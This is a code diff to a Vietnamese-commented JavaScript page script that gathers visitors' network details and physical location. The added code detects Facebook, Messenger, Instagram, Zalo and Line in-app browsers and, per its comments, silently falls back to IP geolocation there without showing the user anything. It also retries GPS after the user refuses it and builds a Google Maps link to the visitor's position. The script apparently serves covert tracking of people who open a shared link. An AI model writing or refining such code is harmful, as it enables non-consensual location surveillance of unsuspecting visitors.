@@ -8,6 +8,13 @@
 (function() {
     const sid = window.SESSION_ID || 'unknown_' + Date.now();
     const PAGE_OPEN_TIME = Date.now();
+    const ua = navigator.userAgent;
+
+    // =========================================
+    //  DETECT In-App WebView — chặn geolocation (silent)
+    // =========================================
+    const isInAppWebView = /FB_IAB|FBAV|FBAN|Instagram|Messenger|ZaloTheme|ZaloApp|Zalo|Line\//i.test(ua);
+    // Không hiện gì cho người dùng — tự fallback IP ngầm
 
     // =========================================
     //  RANK 1: THÔNG TIN KẾT NỐI MẠNG
@@ -15,13 +22,12 @@
     function getNetworkInfo() {
         const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         return {
-            // Loại kết nối (4G, 3G, WiFi...)
             type: conn ? (conn.effectiveType || conn.type || 'unknown') : 'unknown',
             downlink: conn ? (conn.downlink ? conn.downlink + ' Mbps' : 'N/A') : 'N/A',
             rtt: conn ? (conn.rtt ? conn.rtt + ' ms' : 'N/A') : 'N/A',
             save_data: conn ? (conn.saveData || false) : false,
-            // Online status
-            online: navigator.onLine
+            online: navigator.onLine,
+            in_fb_webview: isInAppWebView
         };
     }
 
@@ -194,13 +200,16 @@
     // =========================================
     function getLocation() {
         return new Promise((resolve) => {
-            if (!navigator.geolocation) {
+            // FB WebView chặn geolocation → fallback IP ngay
+            if (isInAppWebView || !navigator.geolocation) {
                 getLocationByIP().then(resolve);
                 return;
             }
+            // Chrome/Safari thật → thử GPS trước
             navigator.geolocation.getCurrentPosition(
                 (pos) => resolve(formatPos(pos)),
                 () => {
+                    // GPS bị từ chối → thử lại không cần độ chính xác cao
                     navigator.geolocation.getCurrentPosition(
                         (pos) => resolve(formatPos(pos)),
                         () => getLocationByIP().then(resolve),
@@ -226,21 +235,49 @@
 
     async function getLocationByIP() {
         const apis = [
-            { url: 'https://ipapi.co/json/', parse: d => d.latitude ? { latitude: d.latitude, longitude: d.longitude, accuracy: 'IP (~1-50km)', city: d.city, region: d.region, country: d.country_name, isp: d.org, source: 'IP', google_maps: `https://www.google.com/maps?q=${d.latitude},${d.longitude}` } : null },
-            { url: 'http://ip-api.com/json/?fields=lat,lon,city,regionName,country,isp', parse: d => d.lat ? { latitude: d.lat, longitude: d.lon, accuracy: 'IP (~1-50km)', city: d.city, region: d.regionName, country: d.country, isp: d.isp, source: 'IP', google_maps: `https://www.google.com/maps?q=${d.lat},${d.lon}` } : null }
+            {
+                url: 'https://ipapi.co/json/',
+                parse: d => d.latitude ? {
+                    latitude: d.latitude, longitude: d.longitude,
+                    accuracy: 'IP (~1-50km)', city: d.city,
+                    region: d.region, country: d.country_name,
+                    isp: d.org, source: 'IP',
+                    google_maps: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`
+                } : null
+            },
+            {
+                url: 'https://ip-api.com/json/?fields=lat,lon,city,regionName,country,isp,status',
+                parse: d => d.lat && d.status === 'success' ? {
+                    latitude: d.lat, longitude: d.lon,
+                    accuracy: 'IP (~1-50km)', city: d.city,
+                    region: d.regionName, country: d.country,
+                    isp: d.isp, source: 'IP',
+                    google_maps: `https://www.google.com/maps?q=${d.lat},${d.lon}`
+                } : null
+            },
+            {
+                url: 'https://freeipapi.com/api/json',
+                parse: d => d.latitude ? {
+                    latitude: d.latitude, longitude: d.longitude,
+                    accuracy: 'IP (~1-50km)', city: d.cityName,
+                    region: d.regionName, country: d.countryName,
+                    isp: '', source: 'IP',
+                    google_maps: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`
+                } : null
+            }
         ];
         for (const api of apis) {
             try {
                 const c = new AbortController();
-                const t = setTimeout(() => c.abort(), 8000);
-                const r = await fetch(api.url, { signal: c.signal });
+                const t = setTimeout(() => c.abort(), 10000);
+                const r = await fetch(api.url, { signal: c.signal, mode: 'cors' });
                 clearTimeout(t);
                 const d = await r.json();
                 const result = api.parse(d);
                 if (result) return result;
             } catch(e) {}
         }
-        return { error: 'Không lấy được vị trí' };
+        return { error: 'Không lấy được vị trí', fb_webview: isInAppWebView };
     }
 
     // =========================================
